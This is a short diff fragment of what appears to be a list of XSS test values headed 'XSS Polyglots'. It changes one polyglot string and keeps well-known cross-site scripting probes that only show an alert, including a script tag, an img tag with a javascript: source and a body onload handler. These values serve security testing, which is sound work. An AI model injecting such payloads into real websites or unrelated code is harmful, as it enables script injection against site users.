@@ -25,7 +25,7 @@ XSS Polyglots
 
 Test values:
 	<marquee>
-	`';!--"<XSS>=&{()}
+	`';!--"<marquee>=&{()}
 	<script>alert(document.location)</script>
 	<img src="javascript:alert(document.location);">
 	<body onload=alert(document.location)>
